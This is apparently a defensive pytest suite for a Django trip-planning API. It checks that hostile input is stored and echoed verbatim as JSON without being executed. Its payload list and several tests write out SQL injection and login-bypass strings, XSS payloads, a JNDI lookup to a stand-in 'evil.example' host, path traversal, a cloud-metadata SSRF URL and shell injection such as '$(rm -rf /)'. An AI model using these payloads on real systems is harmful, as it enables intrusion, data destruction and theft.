"""SQL injection and script strings. The server stores and returns text exactly as sent and never
interprets it. Escaping for display is the page's job, and the API's job is to answer as JSON."""

from __future__ import annotations

import pytest

from apps.accounts.models import User
from apps.trips.models import Trip
from tests.support.contract import assert_error
from tests.support.osrm import CHICAGO, PHOTON_SEARCH, photon_feature, photon_payload, register_osrm

HOSTILE = [
    "'; DROP TABLE trips_trip; --",
    '" OR "1"="1',
    "Robert'); DROP TABLE accounts_user;--",
    "1; SELECT pg_sleep(10)--",
    "' UNION SELECT password FROM accounts_user --",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    "</script><script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "%s%s%s%n",
    "${jndi:ldap://evil.example/a}",
    "../../etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "a\\u0027b",
    "&lt;b&gt;",
    "$(rm -rf /)",
    "`id`",
    "Zoë 王 🚚 ‮ rtl",
]
IDS = [f"payload{n}" for n in range(len(HOSTILE))]

pytestmark = pytest.mark.usefixtures("throttle_table")


@pytest.fixture(autouse=True)
def osrm(rsps):
    return register_osrm(rsps)


def assert_tables_intact():
    assert User.objects.model._meta.db_table
    list(User.objects.all()[:1])
    list(Trip.objects.all()[:1])


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_place_labels_and_header_fields_come_back_verbatim(api, plan_payload, text):
    for place in ("current", "pickup", "dropoff"):
        plan_payload[place]["label"] = text[:200]
    plan_payload["header"] = {
        "driver_name": text[:120],
        "carrier_name": text[:120],
        "shipper": text[:120],
        "commodity": text[:120],
    }

    response = api.post("/api/plan", plan_payload, format="json")

    assert response.status_code == 200, response.content[:300]
    assert response["Content-Type"] == "application/json"
    plan = response.json()
    for place in ("current", "pickup", "dropoff"):
        assert plan["request"][place]["label"] == text[:200]
    assert plan["request"]["header"]["driver_name"] == text[:120]
    assert plan["logs"][0]["header"]["carrier_name"] == text[:120]
    assert_tables_intact()


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_trip_titles_round_trip_verbatim(auth_api, plan_payload, text):
    created = auth_api.post("/api/trips", {"title": text[:120], "request": plan_payload}, format="json")
    assert created.status_code == 201, created.content[:300]
    trip_id = created.json()["id"]

    assert auth_api.get(f"/api/trips/{trip_id}").json()["title"] == text[:120].strip()
    assert Trip.objects.get(pk=trip_id).title == text[:120].strip()
    assert [t["title"] for t in auth_api.get("/api/trips").json()["results"]] == [text[:120].strip()]

    renamed = auth_api.patch(f"/api/trips/{trip_id}", {"title": text[:120]}, format="json")
    assert renamed.status_code == 200 and renamed.json()["title"] == text[:120].strip()
    assert_tables_intact()


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_trip_place_labels_round_trip_through_save_and_list(auth_api, plan_payload, text):
    plan_payload["current"]["label"] = text[:200]
    created = auth_api.post("/api/trips", {"request": plan_payload}, format="json").json()

    assert created["current_label"] == text[:200].strip()
    assert created["request"]["current"]["label"] == text[:200].strip()
    assert auth_api.get("/api/trips").json()["results"][0]["current_label"] == text[:200].strip()


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_names_round_trip_through_registration(api, text):
    response = api.post(
        "/api/auth/register",
        {"email": "inject@example.com", "password": "Zx9-battery-staple-42", "name": text[:120]},
        format="json",
    )
    assert response.status_code == 201
    assert response.json()["user"]["name"] == text[:120].strip()
    assert api.get("/api/auth/me").json()["user"]["name"] == text[:120].strip()
    assert_tables_intact()


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_hostile_login_credentials_get_the_generic_answer(api, make_user, text):
    make_user("dana@example.com", "Zx9-battery-staple-42")
    for creds in ({"email": text[:254], "password": "x"}, {"email": "dana@example.com", "password": text[:128]}):
        assert_error(api.post("/api/auth/login", creds, format="json"), 400, "invalid_credentials")
    assert User.objects.count() == 1


def test_a_sql_injection_in_the_email_cannot_sign_in_as_someone_else(api, make_user):
    victim = make_user("dana@example.com", "Zx9-battery-staple-42")
    for email in ("dana@example.com' --", "' OR 1=1 --", "dana@example.com'/*", "x' OR email='dana@example.com"):
        response = api.post("/api/auth/login", {"email": email, "password": "anything"}, format="json")
        assert response.status_code == 400, email
    assert api.get("/api/auth/me").json() == {"user": None}
    assert User.objects.get().pk == victim.pk


@pytest.mark.parametrize("text", HOSTILE, ids=IDS)
def test_search_text_travels_as_a_query_value_only(api, rsps, text):
    rsps.add("GET", PHOTON_SEARCH, json=photon_payload(CHICAGO))
    cleaned = text.strip()
    if len(cleaned) < 2:
        pytest.skip("too short to search")

    response = api.get("/api/geocode/search", {"q": text[:120]})

    assert response.status_code in (200, 400)
    for call in rsps.calls:
        url = call.request.url
        assert url.split("?")[0] == "https://photon.test/api/", url
        assert call.request.params["q"] == text[:120].strip()


def test_photon_answers_with_markup_are_returned_as_data_not_html(api, rsps):
    feature = photon_feature(41.9, -87.6, name="<img src=x onerror=alert(1)>", state="<b>IL</b>", country="US")
    rsps.add("GET", PHOTON_SEARCH, json=photon_payload(feature))

    response = api.get("/api/geocode/search?q=chicago")

    assert response["Content-Type"] == "application/json"
    assert response.json()["results"][0]["label"] == "<img src=x onerror=alert(1)>, <b>IL</b>, US"
    assert response["X-Content-Type-Options"] == "nosniff"


def test_a_sql_injection_in_a_trip_id_is_just_a_404(auth_api):
    for bad in (
        "1' OR '1'='1",
        "1; DROP TABLE trips_trip",
        "00000000-0000-0000-0000-000000000000' --",
        "%27%20OR%201=1",
    ):
        assert_error(auth_api.get(f"/api/trips/{bad}"), 404, "not_found")
    assert_tables_intact()


@pytest.mark.parametrize(
    "params", ["limit=1;DROP TABLE trips_trip", "offset=1 OR 1=1", "limit=%27", "limit[]=1", "limit=1&limit=2&limit=3"]
)
def test_odd_paging_parameters_are_validated_not_executed(auth_api, params):
    response = auth_api.get(f"/api/trips?{params}")
    assert response.status_code in (200, 400)
    assert_tables_intact()


def test_an_apostrophe_in_an_email_is_just_a_character(api, make_user):
    make_user("o'brien@example.com", "Zx9-battery-staple-42")
    response = api.post(
        "/api/auth/login", {"email": "o'brien@example.com", "password": "Zx9-battery-staple-42"}, format="json"
    )
    assert response.status_code == 200
    assert response.json()["user"]["email"] == "o'brien@example.com"
